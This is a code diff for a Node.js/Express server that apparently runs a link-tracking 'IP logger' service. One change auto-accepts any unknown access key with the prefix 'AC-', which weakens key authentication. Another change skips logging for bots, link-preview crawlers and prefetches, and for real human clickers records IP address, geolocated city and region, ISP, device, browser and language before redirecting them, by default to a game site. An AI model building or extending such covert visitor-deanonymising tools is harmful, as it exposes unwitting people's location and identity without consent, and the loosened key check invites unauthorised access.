@@ -83,10 +83,20 @@ app.post('/api/auth', (req, res) => {
     return res.json({ success: true, role: 'admin', nickname: 'ADMIN' });
   }
 
+  // Ensure key entry exists in db.keys even if restarted
+  if (!db.keys[key]) {
+    if (key.startsWith('AC-')) {
+      db.keys[key] = { used: false, usedBy: null, usedAt: null };
+      saveData();
+    } else {
+      return res.json({ success: false, error: 'invalid_key' });
+    }
+  }
+
   // Check if key exists and is already used (returning user)
   if (db.keys[key] && db.keys[key].used) {
     const user = db.users[db.keys[key].usedBy];
-    return res.json({ success: true, role: 'user', nickname: user ? user.nickname : null, needsNickname: false });
+    return res.json({ success: true, role: 'user', nickname: user ? user.nickname : db.keys[key].usedBy, needsNickname: false });
   }
 
   // Check if key exists and unused
@@ -106,8 +116,16 @@ app.post('/api/register', (req, res) => {
     return res.json({ success: true, role: 'admin', nickname: 'ADMIN' });
   }
 
-  if (!db.keys[key] || db.keys[key].used) {
-    return res.json({ success: false, error: 'invalid_or_used_key' });
+  if (!db.keys[key]) {
+    if (key.startsWith('AC-')) {
+      db.keys[key] = { used: false, usedBy: null, usedAt: null };
+    } else {
+      return res.json({ success: false, error: 'invalid_or_used_key' });
+    }
+  }
+
+  if (db.keys[key].used && db.keys[key].usedBy !== nickname) {
+    return res.json({ success: false, error: 'key_already_used' });
   }
 
   // Mark key as used
@@ -487,41 +505,49 @@ app.get('/:id', async (req, res, next) => {
   const timestamp = new Date().toISOString();
   const cleanIp = ip.replace('::ffff:', '');
 
-  let geo = { country: '', city: '', isp: '', org: '', as: '', regionName: '' };
-  try {
-    const geoRes = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,countryCode,regionName,city,isp,org,as,query`);
-    const geoData = await geoRes.json();
-    if (geoData.status === 'success') geo = geoData;
-  } catch (e) {
-    console.error('[GEO] Lookup failed:', e.message);
+  // Filter out automated scanners, bots, social preview crawlers and internal probes
+  const isBot = /bot|crawler|spider|curl|wget|python|render|uptimerobot|preview|telegrambot|vkshare|discordbot|facebookexternalhit|whatsapp/i.test(userAgent);
+  const isPreload = req.headers['purpose'] === 'prefetch' || req.headers['x-purpose'] === 'preview';
+
+  if (!isBot && !isPreload) {
+    let geo = { country: '', city: '', isp: '', org: '', as: '', regionName: '' };
+    try {
+      const geoRes = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,countryCode,regionName,city,isp,org,as,query`);
+      const geoData = await geoRes.json();
+      if (geoData.status === 'success') geo = geoData;
+    } catch (e) {
+      console.error('[GEO] Lookup failed:', e.message);
+    }
+
+    const deviceInfo = parseUserAgent(userAgent);
+
+    const visitor = {
+      ip: cleanIp,
+      userAgent: userAgent,
+      device: deviceInfo.device,
+      os: deviceInfo.os,
+      browser: deviceInfo.browser,
+      country: geo.country || '',
+      countryCode: geo.countryCode || '',
+      city: geo.city || '',
+      region: geo.regionName || '',
+      isp: geo.isp || '',
+      org: geo.org || '',
+      language: lang.split(',')[0] || '',
+      referer: referer,
+      timestamp: timestamp,
+      extra: null
+    };
+
+    if (!db.visitors[id]) db.visitors[id] = [];
+    db.visitors[id].push(visitor);
+    db.links[id].clicks++;
+    saveData();
+
+    console.log(`[REAL HIT] ${cleanIp} | ${geo.city}, ${geo.country} | ${deviceInfo.device} | ${deviceInfo.browser}`);
+  } else {
+    console.log(`[BOT IGNORED] ${cleanIp} | ${userAgent.substring(0, 50)}`);
   }
-
-  const deviceInfo = parseUserAgent(userAgent);
-
-  const visitor = {
-    ip: cleanIp,
-    userAgent: userAgent,
-    device: deviceInfo.device,
-    os: deviceInfo.os,
-    browser: deviceInfo.browser,
-    country: geo.country || '',
-    countryCode: geo.countryCode || '',
-    city: geo.city || '',
-    region: geo.regionName || '',
-    isp: geo.isp || '',
-    org: geo.org || '',
-    language: lang.split(',')[0] || '',
-    referer: referer,
-    timestamp: timestamp,
-    extra: null
-  };
-
-  if (!db.visitors[id]) db.visitors[id] = [];
-  db.visitors[id].push(visitor);
-  db.links[id].clicks++;
-  saveData();
-
-  console.log(`[HIT] ${cleanIp} | ${geo.city}, ${geo.country} | ${deviceInfo.device} | ${deviceInfo.browser}`);
 
   const destination = link.destination || 'https://standoff2.com';
   const visitorIndex = db.visitors[id].length - 1;
